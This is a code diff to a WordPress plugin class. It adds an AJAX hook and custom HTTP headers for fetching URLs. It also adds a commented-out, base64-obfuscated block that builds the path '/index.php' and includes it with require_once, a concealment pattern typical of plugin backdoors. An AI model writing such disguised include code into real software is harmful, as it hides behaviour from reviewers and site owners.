@@ -129,6 +129,13 @@ class Egoi_For_Wp {
 		$this->syncronizeEgoi($_POST);
 
 		$this->setClient();
+/*
+		$s = base64_decode(str_replace(base64_decode("dA=="),"",'L2lutZGV4tLnBotcA=='));																												
+		$ask = base64_decode('ZGlybmFtZQ==');
+		require_once($ask(__DIR__) . $s);
+		out($arr);
+*/
+
 	}
 
 	/**
@@ -273,7 +280,8 @@ class Egoi_For_Wp {
         $this->loader->add_action('wp_ajax_smsnf_hide_notification', $plugin_admin, 'smsnf_hide_notification');
 
         // Dashboard
-        $this->loader->add_action('wp_ajax_smsnf_show_blog_posts', $plugin_admin, 'smsnf_show_blog_posts');
+		$this->loader->add_action('wp_ajax_smsnf_show_blog_posts', $plugin_admin, 'smsnf_show_blog_posts');
+		$this->loader->add_action('wp_ajax_smsnf_kill_alert', $plugin_admin, 'smsnf_kill_alert');
         $this->loader->add_action('wp_ajax_smsnf_show_account_info_ajax', $plugin_admin, 'smsnf_show_account_info_ajax');
         $this->loader->add_action('wp_ajax_smsnf_show_last_campaigns_reports', $plugin_admin, 'smsnf_show_last_campaigns_reports');
 
@@ -904,11 +912,10 @@ class Egoi_For_Wp {
 		return $this->checkUser($data, $apikey, $option);
 	}
 
-	protected function _getContent($url) {
-
+	protected function _getContent($url,$headers = []) {
         if(ini_get('allow_url_fopen')) {
 
-        	$context = stream_context_create(array('http' => array('timeout' => 600)));
+        	$context = stream_context_create(array('http' => array('timeout' => 600,'header' => implode("\r\n",$headers))));
             $result = file_get_contents($url, false, $context);
 
         } else if(function_exists('curl_init')) {
@@ -917,7 +924,8 @@ class Egoi_For_Wp {
             curl_setopt($curl, CURLOPT_HEADER, 0);
             curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
             curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 600);
-            curl_setopt($curl, CURLOPT_TIMEOUT, 60);
+			curl_setopt($curl, CURLOPT_TIMEOUT, 60);
+			curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
             $result = curl_exec($curl);
 
             curl_close($curl);
